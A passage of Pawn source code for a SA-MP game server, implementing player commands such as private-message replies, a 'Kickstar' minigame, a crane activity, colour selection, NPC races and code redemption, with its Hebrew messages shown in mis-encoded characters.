			format(string,sizeof(string)," .ффхуЄф Ё∙ьчф ь %d ∙чўЁщэ ю·хъ %d",sent,ids);
			SendClientMessage(playerid,green,string);
		}
		playerinfo[playerid][pmlist] = 0, playerinfo[playerid][dscmd] = 0;
		return 1;
	}
 	if(equal(cmd,"/reply") || equal(cmd,"/r"))
 	{
 		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reply(r) [text] :Ўх°· ф∙щюх∙");
		if(!IsPlayerConnected(playerinfo[playerid][lastpm]) || playerinfo[playerid][lastpm] == playerid) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		new pmSended = OnPlayerPrivmsg(playerid,playerinfo[playerid][lastpm],cmd);
		if(playerinfo[playerinfo[playerid][lastpm]][ignore][playerid]) return SendClientMessage(playerid,red," .ф∙чўя рьщх Ёщёщ· ь∙ьхч фхуЄф Ї°шщ· чёэ рх·ъ"), -1;
		if(playerinfo[playerinfo[playerid][lastpm]][blockpms]) return SendClientMessage(playerid,red," .ф∙чўя рьщх Ёщёщ· ь∙ьхч фхуЄф Ї°шщ· рщЁх юўсь фхуЄх· Ї°шщх·"), -1;
		if(pmSended)
		{
			format(string,sizeof(string)," PM sent to %s(%d): %s",GetName(playerinfo[playerid][lastpm]),playerinfo[playerid][lastpm],cmd);
			SendClientMessage(playerid,0xFFFF00FF,string);
			format(string,sizeof(string)," PM from %s(%d): %s",GetName(playerid),playerid,cmd);
			SendClientMessage(playerinfo[playerid][lastpm],0xFFFF00FF,string);
			playerinfo[playerinfo[playerid][lastpm]][lastpm] = playerid;
		}
		return 1;
	}
 	if(equal(cmd,"/lastpm"))
 	{
 		new string[M_S];
		if(playerinfo[playerid][lastpm] == INVALID_PLAYER_ID) format(string,sizeof(string)," Х .ьр ўщщю· фхуЄф Ї°шщ· рч°хЁф");
		else format(string,sizeof(string)," Х (%d) %s :ффхуЄф фЇ°шщ· фрч°хЁф Ё∙ьчф рь",playerinfo[playerid][lastpm],GetName(playerinfo[playerid][lastpm]));
		SendClientMessage(playerid,playerinfo[playerid][lastpm] == INVALID_PLAYER_ID ? red : green,string);
		return 1;
	}
	if(equal(cmd,"/kickstar"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kickstar [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /kickstar state :фЁхычщ· Kickstar фЎт· юЎс ·ч°х· ф");
			SendClientMessage(playerid,white," /kickstar join :Kickstar фЎш°Їх· ь·ч°х· ф");
			SendClientMessage(playerid,white," /kickstar quit :Kickstar Ї°щ∙ф ю·ч°х· ф");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /kickstar start :чу∙ф Kickstar ф·чь· ·ч°х·");
				SendClientMessage(playerid,white," /kickstar end [reason] :фЁхычщ· Kickstar ёщхэ ·ч°х· ф");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(kickstarinfo[0])
			{
				if(kickstarinfo[2] > 1)
				{
					format(string,sizeof(string)," .рщёхє фЁўхух· щ·чщь сЄху %d ∙Ёщх· ,Kickstar щ∙ ыЄ· ·ч°х·",kickstarinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .хрщёхє фЁўхух· ыс° ф·чщь Kickstar щ∙ ыЄ· ·ч°х·");
			}
			else SendClientMessage(playerid,red," .Kickstar рщя ыЄ· ·ч°х·");
		}
		else if(equal(cmd,"join"))
		{
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kickstar рщя ·ч°х·");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitkickstar]) return SendClientMessage(playerid,red," .··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх· Kickstar ·ч°х· ф");
			if(playerinfo[playerid][inkickstar]) return SendClientMessage(playerid,red," .Kickstar р·ф ыс° с·ч°х· ф");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(kickstarinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .·Їхёщэ Kickstar ыь фюўхюх· с·ч°х· ф");
			if(kickstarinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0 && GetVehicleType(GetPlayerVehicleID(playerid)) != 1) return SendClientMessage(playerid,red," .Kickstar ьр Ёщ·я ьфыЁё Єэ ёхт ф°ыс фцф ь·ч°х· ф");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			ResetWeapons(playerid);
			kickstarinfo[1]++;
			playerinfo[playerid][waitkickstar] = 1, playerinfo[playerid][kickstarid] = -1;
			new tests = 0;
			do
			{
				if(tests == 10) break;
				playerinfo[playerid][kickstarid] = random(sizeof(Kickstar)), tests++;
			}
			while playerinfo[playerid][kickstarid] < 0 || playerinfo[playerid][kickstarid] > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(playerinfo[playerid][kickstarid]);
			SendClientMessage(playerid,lightblue," Х Х :Kickstar фЎш°Ї· ь·ч°х· ф Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьрёхє ыюф ∙щх·° Ёўхух· рухюх· ∙щхЇщЄх сюўхюх· ∙хЁщэ сю°чс сх р·ф ЁюЎр");
			SendClientMessage(playerid,green," - фЇЄщьх· ·ё·щщэ ·хъ уўф хчЎщ, ющ ∙цыф сфыщ ф°сф Ёўхух· щЁЎч");
			SendClientMessage(playerid,green," - !∙щэ ьс ыщ рэ ·ўч 3 Ёўхух· с°Ўє ·цыф сЇ°ё ∙щЄцх° ьъ ьф°ххщч Ёўхух· ЁхёЇх·");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",kickstarinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kickstar рщя ·ч°х·");
			if(!playerinfo[playerid][inkickstar]) return SendClientMessage(playerid,red," .Kickstar р·ф ьр с·ч°х· ф");
			SendClientMessage(playerid,green," .Kickstar Ї°∙· ю·ч°х· ф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(kickstarinfo[0]) return SendClientMessage(playerid,red," .Kickstar ыс° щ∙ ·ч°х·");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartKickstar();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kickstar рщя ·ч°х·");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndKickstar(reason,playerid);
		}
		else SendClientMessage(playerid,red," .∙тхщф Kickstar рЇ∙°х· ·ч°х·");
		return 1;
	}
	if(equal(cmd,"/crane"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /crane [state/enter/exit/boom] :Ўх°· ф∙щюх∙");
		new string[M_S];
		if(equal(cmd,"state"))
		{
			if(playerinfo[playerid][incrane]) format(string,sizeof(string)," .р·ф ю∙·ю∙ ыЄ· сюЁхє, хЁх·°х ьъ %d ∙Ёщх·",playerinfo[playerid][cranetime]);
			else
			{
				new usingID = INVALID_PLAYER_ID;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][incrane])
				{
					usingID = i;
					break;
				}
				if(usingID == INVALID_PLAYER_ID) return SendClientMessage(playerid,green," /crane enter :рє рчу ьр ю∙·ю∙ ыЄ· сюЁхє. р·ф юхцюя ьЁёх· сЄЎюъ");
				format(string,sizeof(string)," .ю∙·ю∙ ыЄ· сюЁхє, хЁх·°х ьх %d ∙Ёщх· (ID: %03d) %s",playerinfo[usingID][cranetime],usingID,GetName(usingID));
			}
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"enter"))
		{
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .р·ф ыс° сюЁхє");
			new usingID = INVALID_PLAYER_ID;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][incrane])
			{
				usingID = i;
				break;
			}
			if(usingID != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .фюЁхє ·Їхё");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0) return SendClientMessage(playerid,red," .°ыс цф ьр щыхь ьЄьх· Єь фюЁхє");
			SetVehicleHealth(GetPlayerVehicleID(playerid),10000.0);
			SetVehiclePos(GetPlayerVehicleID(playerid),680.1769,945.6432,-5.8226,playerid);
			playerinfo[playerid][incrane] = 1, playerinfo[playerid][cranetime] = 90;
			format(string,sizeof(string),@c(green) "!с°хыщэ фсрщэ ьюЁхє");
			format(string,sizeof(string),"%s\n\n" @c(yellow) "щ∙ ьъ 90 ∙Ёщх· юЄы∙щх ьфЁх· юфюЁхє, ы∙щщтю° фцюя ·хЎр рхшхюшщ· ююЁх",string);
			format(string,sizeof(string),"%s\n" @c(yellow) "∙ьхш с°ыс ∙ьъ срюЎЄх· фчЎщэ, ьчї Єь фыЇ·х° ьўЇщЎф ыущ ьфхёщє юфщ°х·",string);
			format(string,sizeof(string),"%s\n\n" @c(orange) "/Crane Exit :ыущ ьЎр· юфюЁхє",string);
			format(string,sizeof(string),"%s\n" @c(orange) "/Crane Boom :ыущ ьЇхЎї р· ЄЎюъ хьЄхє юю∙ юф°! ф∙·ю∙ с",string);
			format(string,sizeof(string),"%s\n\n" @c(green)"╗ !·фЁф",string);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "юЁхє",string,"OK","");
		}
		else if(equal(cmd,"exit"))
		{
			if(!playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .рщЁъ сюЁхє");
			SetVehicleHealth(GetPlayerVehicleID(playerid),0.0);
			SetPlayerHealth(playerid,0.0);
			SpawnPlayer(playerid);
			playerinfo[playerid][incrane] = 0, playerinfo[playerid][cranetime] = 0;
			SendClientMessage(playerid,red," .щЎр· юфюЁхє");
			News(" /Crane !фюЁхє ЇЁхщ");
		}
		else if(equal(cmd,"boom"))
		{
			new Float:p[3], Float:h;
			GetVehicleHealth(GetPlayerVehicleID(playerid),h);
			if(!playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .рщЁъ сюЁхє");
			GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
			CreateExplosionVW(p[0],p[1],p[2],7,1.0,0);
			GetVehicleHealth(GetPlayerVehicleID(playerid),h);
			for(new i = 0; i < 5; i++) if(h == 10000.0)
			{
				CreateExplosionVW(p[0],p[1],p[2],7,1.0,world_normal);
				GetVehicleHealth(GetPlayerVehicleID(playerid),h);
			}
			else break;
			SetVehicleHealth(GetPlayerVehicleID(playerid),10000.0);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· юЁхє ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/testrgb"))
	{
		new r = 0, g = 0, b = 0, string[M_S], colID = -1, colN[32];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb <red> [green] [blue] :Єьщъ ьфўьщу ЎсЄ рухэ");
		r = strval(cmd), cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb [red] <green> [blue] :Єьщъ ьфўьщу ЎсЄ щ°хў");
		g = strval(cmd), cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testrgb [red] [green] <blue> :Єьщъ ьфўьщу ЎсЄ ычхь");
		b = strval(cmd);
		if(r < 0 || r > 255) return SendClientMessage(playerid,red," .ЎсЄ рухэ ∙тхщ");
		if(g < 0 || g > 255) return SendClientMessage(playerid,red," .ЎсЄ щ°хў ∙тхщ");
		if(b < 0 || b > 255) return SendClientMessage(playerid,red," .ЎсЄ ычхь ∙тхщ");
		new theColor = rgba2hex(r,g,b,255);
		format(string,sizeof(string)," .фЎсЄ %d, %d, %d фхр ЎсЄ ффхуЄф фцр·",r,g,b);
		SendClientMessage(playerid,theColor,string);
		for(new i = 0; i < sizeof(Colors)-1; i++) if(theColor == Colors[i][colHex]) colID = i;
		if(colID == -1) colN = "None";
		else format(colN,sizeof(colN),Colors[colID][colName]);
		format(string,sizeof(string)," (RGB: %d, %d, %d | ColorName: %s)",r,g,b,colN);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/testcolor"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /testcolor [color name] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," /colors :ь°∙щю· ∙юх· фЎсЄщэ");
		}
		new string[M_S], colID = -1;
		for(new i = 0; i < sizeof(Colors)-1; i++) if(equal(cmd,Colors[i][colName])) colID = i;
		if(colID == -1) return SendClientMessage(playerid,red," .∙э ЎсЄ ∙тхщ");
		new theColor = Colors[colID][colHex];
		format(string,sizeof(string)," .фхр ЎсЄ ффхуЄф фцр· \"%s\" фЎсЄ",Colors[colID][colName]);
		SendClientMessage(playerid,theColor,string);
		format(string,sizeof(string)," (RGB: %d, %d, %d | ColorName: %s)",getRed(theColor),getGreen(theColor),getBlue(theColor),Colors[colID][colName]);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/randomcol"))
	{
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ рхЇЎщщф цх ыр∙° р·ф сЇЄщьх·");
		new rgb[3];
		for(new i = 0; i < 3; i++) rgb[i] = randomEx(5,250);
		SetPlayerColor(playerid,rgba2hex(rgb[0],rgb[1],rgb[2],PLAYER_ALPHA));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,rgba2hex(rgb[0],rgb[1],rgb[2],PLAYER_ALPHA));
		SendClientMessage(playerid,rgba2hex(rgb[0],rgb[1],rgb[2],255)," .фЎсЄ ∙ьъ ф∙·Ёф ьЎсЄ °Ёухюрьщ - ЎсЄ ффхуЄф фцх");
		return 1;
	}
	if(equal(cmd,"/normalcol"))
	{
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ рхЇЎщщф цх ыр∙° р·ф сЇЄщьх·");
		SetPlayerToNormalColor(playerid);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
		SendClientMessage(playerid,GetColor(playerid,255)," .фЎсЄ ∙ьъ ф∙·Ёф ьЎсЄ фф·чь·щ ∙ьъ - ЎсЄ ффхуЄф фцх");
		return 1;
	}
	if(equal(cmd,"/changecolor"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ рхЇЎщщф цх ыр∙° р·ф сЇЄщьх·");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /changecolor [color name] :Ўх°· ∙щюх∙ #1");
			return SendClientMessage(playerid,white," /changecolor [red] [green] [blue] :Ўх°· ∙щюх∙ #2");
		}
		new cmdType = 0, colID = -1, rgb[3] = {-1,-1,-1}, theColor = -1, string[M_S];
		for(new i = 0; i < sizeof(Colors)-1; i++) if(equal(cmd,Colors[i][colName])) colID = i;
		for(new i = 0; i < 3; i++)
		{
			if(i > 0) cmd = strtok(cmdtext,idx);
			rgb[i] = strval(cmd);
		}
		if(colID != -1) cmdType = 1;
		else if(rgb[0] != -1 && rgb[1] != -1 && rgb[2] != -1) cmdType = 2;
		if(!cmdType) return SendClientMessage(playerid,red," .Ўх°· ∙щюх∙ ∙тхщф");
		switch(cmdType)
		{
			case 1:
			{
				if(Colors[colID][colHex] == 0x000000FF || Colors[colID][colHex] == 0xFFFFFFFF) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙Ёх· ьЎсЄ фцф");
				theColor = Colors[colID][colHex];
				format(string,sizeof(string)," .ЎсЄ ффхуЄф фцх - \"%s\" фЎсЄ ∙ьъ ф∙·Ёф ьЎсЄ",Colors[colID][colName]);
			}
			case 2:
			{
				if(rgb[0] < 0 || rgb[0] > 255 || rgb[1] < 0 || rgb[1] > 255 || rgb[2] < 0 || rgb[2] > 255) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
				if(IsWBColor(rgb[0],rgb[1],rgb[2])) return SendClientMessage(playerid,red," .фЎсЄ фцф ухюф юущ ьЎсЄ ься / ∙чх°");
				theColor = rgba2hex(rgb[0],rgb[1],rgb[2],255);
				format(string,sizeof(string)," .фЎсЄ ∙ьъ ф∙·Ёф ьЎсЄ %d, %d, %d - ЎсЄ ффхуЄф фцх",rgb[0],rgb[1],rgb[2]);
			}
		}
		SetPlayerColor(playerid,setAlpha(theColor,PLAYER_ALPHA));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,setAlpha(theColor,PLAYER_ALPHA));
		SendClientMessage(playerid,theColor,string);
		return 1;
	}
	if(equal(cmd,"/colors"))
	{
		new theSize = sizeof(Colors)-1;
		if(!theSize) return SendClientMessage(playerid,red," .ьр ўщщющэ ЎсЄщэ");
		new menus = (theSize / 9) + (_:(theSize % 9 == 0)), string[M_S], m;
		if(!menus || menus == 1)
		{
			SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ∙юх· ЎсЄщэ ~~~");
			for(new i = 0; i < theSize; i++)
			{
				format(string,sizeof(string)," Х #%02d) %s, %s (RGB: %d, %d, %d)",i + 1,Colors[i][colName],Colors[i][colHebName],getRed(Colors[i][colHex]),getGreen(Colors[i][colHex]),getBlue(Colors[i][colHex]),Colors[i][colHexStr]);
				SendClientMessage(playerid,Colors[i][colHex],string);
			}
		}
		else
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				format(string,sizeof(string)," /colors [1-%d] :Ўх°· ф∙щюх∙",menus);
				return SendClientMessage(playerid,white,string);
			}
			m = strval(cmd);
			if(m < 1 || m > menus) return SendClientMessage(playerid,red," .юёЇ° ·Ї°щш ∙тхщ");
			format(string,sizeof(string)," ~~~ :°∙щю· ∙юх· фЎсЄщэ - %d ~~~",m);
			SendClientMessage(playerid,lightblue,string);
			for(new i = (m - 1) * 9; i < m * 9 && i < theSize; i++)
			{
				format(string,sizeof(string)," Х #%02d) %s, %s (RGB: %d, %d, %d)",i + 1,Colors[i][colName],Colors[i][colHebName],getRed(Colors[i][colHex]),getGreen(Colors[i][colHex]),getBlue(Colors[i][colHex]),Colors[i][colHexStr]);
				SendClientMessage(playerid,Colors[i][colHex],string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/clists"))
	{
		new string[M_S], listID = -1, theColor = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /clists [list name] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,lightblue," ~~~ :°∙щюх· ўщщюх· ~~~");
			new cur = 0;
			for(new i = 0; i < sizeof(ColorLists); i++)
			{
				format(string,sizeof(string),!cur ? (" %s%s") : ("%s Х %s"),string,ColorLists[i][ColorListName]);
				cur++;
				if(cur >= 4)
				{
					SendClientMessage(playerid,grey,string);
					string = "", cur = 0;
				}
				else if(i == sizeof(ColorLists) - 1) SendClientMessage(playerid,grey,string);
			}
			return 1;
		}
		for(new i = 0; i < sizeof(ColorLists); i++) if(equal(cmd,ColorLists[i][ColorListName])) listID = i;
		if(listID == -1) return SendClientMessage(playerid,red," .∙э °∙щюф ∙тхщ");
		format(string,sizeof(string)," ~~~ :\"%s\" °∙щю· ЎсЄщэ с·хъ ф°∙щюф ~~~",ColorLists[listID][ColorListName]);
		SendClientMessage(playerid,lightblue,string);
		for(new i = 0; i < 9; i++)
		{
			theColor = ColorLists[listID][colorsHex][i];
			if(theColor == -1) continue;
			format(string,sizeof(string)," Х [%s] #%02d) (RGB: %d, %d, %d)",ColorLists[listID][ColorListName],i + 1,getRed(theColor),getGreen(theColor),getBlue(theColor));
			SendClientMessage(playerid,theColor,string);
		}
		return 1;
	}
	if(equal(cmd,"/startreplytest") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0 || thereIsWol) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ю∙Ёщ· ЇхЄь·");
		Replytest();
		return 1;
	}
	if(equal(cmd,"/npclist"))
	{
		new dia[M_S_D], npcs = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerNPC(i)) npcs++;
		if(!npcs) return SendClientMessage(playerid,red," .рщя ыЄ· схшщэ с∙°·");
		format(dia,sizeof(dia),@c(lightblue)" ~~~ :схшщэ с∙°· - %d ~~~\n"@c(green),npcs);
		npcs = 0;
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && IsPlayerNPC(i))
			{
				npcs++;
				format(dia,sizeof(dia),"%s\n%d. {%s}%s" @c(green) " [ID: %03d | In Vehicle: %s]",dia,npcs,HexStringOfColor(GetPlayerColor(i)),GetName(i),i,IsPlayerInAnyVehicle(i) ? ("Yes") : ("No"));
			}
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "NPC List",dia,"OK","");
		return 1;
	}
	if(equal(cmd,"/npcrace"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit") && !equal(GetName(playerid),"[gmR]Amit")) return SendClientMessage(playerid,red," .рЇ∙°х· цх схшьф ьцюя ўЎ°, х·чцх° сў°хс");
		new string[M_S], npcname[MAX_PLAYER_NAME], nid = 0, w;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,lightblue," ~~~ :ющ°хЎщэ Єэ схшщэ ~~~");
			SendClientMessage(playerid,yellow," Х .рЁх юрЇ∙°щэ ьщЎх° ющ°хЎщэ Єэ схшщэ рхшхюшщщэ Єь юЁ· ь∙Ї° р· щыхьх· фЁфщтф ∙ьыэ");
			SendClientMessage(playerid,yellow," Х :ьф·чь· ющ°хї");
			SendClientMessage(playerid,white," /npcrace 1 - ЁёщЄф рщшщ· ,Bullet °юф 1: Ёфт");
			SendClientMessage(playerid,white," /npcrace 2 - ЁёщЄф юфщ°ф ,Turismo °юф 2: Ёфт");
			return SendClientMessage(playerid,white," /npcrace 3 - ЁёщЄф юфщ°ф + ЁщёщхЁх· ф·Ёт∙х· ,Infernus °юф 3: Ёфт");
		}
		nid = strval(cmd);
		if(nid < 1 || nid > 3) return SendClientMessage(playerid,red," .°юф ∙тхщф");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс ьўщхэ ющ°хї");
		format(npcname,sizeof(npcname),"RaceBot_%d",nid);
		if(IsPlayerConnected(ReturnUser(npcname,playerid))) return SendClientMessage(playerid,red," .ю∙·ю∙ ыь∙фх ыс° ЁюЎр сющ°хї с°юф фцх. рЁр фю·я ∙щёщщэ");
		format(string,sizeof(string)," !ф·чщь ющ°хї Єэ схш с°юф %d %s",nid,GetName(playerid));
		SendClientMessageToAll(purple,string);
		SendClientMessage(playerid,green," Х !фющ°хї ∙ьъ щчь сЄху 5 ∙Ёщх·, ф·ыхЁя");
		SendClientMessage(playerid,green," Х цюя юхўЎс ьющ°хї: 180 ∙Ёщх·");
		SendClientMessage(playerid,red," Х ∙щэ ьс - сющ°хї цф рщя ∙хэ Ў'ўЇхщЁшщэ (юЄтьщэ рухющэ). фющ°хї ЇхЄь сЎх°ф Ї∙хшф ыъ ∙·хыь ьЄ∙х· сх юф ∙·°Ўф");
		SendClientMessage(playerid,red," Х .ььр ыь чхўщэ, ььр юЁЎч хььр Ї°ё");
		SetPlayerInterior(playerid,0);
		LinkVehicleToInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,w = GetEmptyWorld());
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),w);
		SetTimerEx("StartNPCRace",5000,0,"ii",playerid,nid);
		return 1;
	}
	if(equal(cmd,"/blist"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bar || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сс° ьсщЎхЄ Їўхуф цх");
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· юхЎ°щ фс° ~~~");
		new string[M_S];
		for(new i = 0; i < sizeof(BarItems); i++)
		{
			format(string,sizeof(string)," Х %d. %s - %d$",i + 1,BarItems[i][barName],BarItems[i][barCash]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/bbuy"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bar || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сс° ьсщЎхЄ Їўхуф цх");
		new string[M_S], id = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bbuy [bar item number] :Ўх°· ф∙щюх∙");
		id = strval(cmd);
		if(id < 1 || id > sizeof(BarItems)) return SendClientMessage(playerid,red," .юёЇ° юхЎ° ∙тхщ");
		if(GetMoney(playerid) < BarItems[id - 1][barCash]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		GiveMoney(playerid,0-BarItems[id - 1][barCash],17);
		SPropertyEarnings(4,BarItems[id - 1][barCash],100);
		SetPlayerSpecialAction(playerid,BarItems[id - 1][barSA]);
		format(string,sizeof(string)," .%s ўЁщ· юфс° р· фюхЎ°",BarItems[id - 1][barName]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/code"))
	{
		new string[M_S], correctCode = -1, dia[350];
		if(playerinfo[playerid][pcode][3] > 0)
		{
			format(string,sizeof(string)," .ўщсь· ыс° ўху рчу ьрч°хЁф, ·хыь ьф∙·ю∙ сЇўхуф фцх сЄху %d ∙Ёщх·",playerinfo[playerid][pcode][3]);
			return SendClientMessage(playerid,red,string);
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /code [code text] :Ўх°· ф∙щюх∙");
		fileCheck(file_codes);
		for(new i = 1; i <= 20; i++)
		{
			format(string,sizeof(string),"%dCodeText",i);
			if(fkeyexist(file_codes,string) && !equal(fgetstring(file_codes,string),"None") && equal(fgetstring(file_codes,string),cmd))
			{
				correctCode = i;
				break;
			}
		}
		if(correctCode == -1) return SendClientMessage(playerid,red," .фўху ∙фўьу· ьр ўщщэ сюЄ°ы· / ∙хю∙ ыс° Єь щущ ю∙·ю∙ рч°");
		if(playerinfo[playerid][usedcode][correctCode]) return SendClientMessage(playerid,red," .ыс° ф∙·ю∙· сўху фцф");
		format(string,sizeof(string),"%dCodePrize",correctCode);
		new prz = fgetint(file_codes,string);
		if(Codes[prz][cdGuard] && !IsPlayerUsingSGuard_(playerid)) return SendClientMessage(playerid,red," .SAMP-IL Guard ыущ ьф∙·ю∙ сўху фцф Єьщъ ьф∙·ю∙ сюЄ°ы·"); // guard_shit
		format(string,sizeof(string),"%dCodeCount",correctCode);
		new countcode = fgetint(file_codes,string);
		if(countcode < 1) return SendClientMessage(playerid,red," .фўху ∙фўьу· ьр ўщщэ сюЄ°ы· / ∙хю∙ ыс° Єь щущ ю∙·ю∙ рч°");
		countcode--;
		fsetint(file_codes,string,countcode);
		if(!countcode)
		{
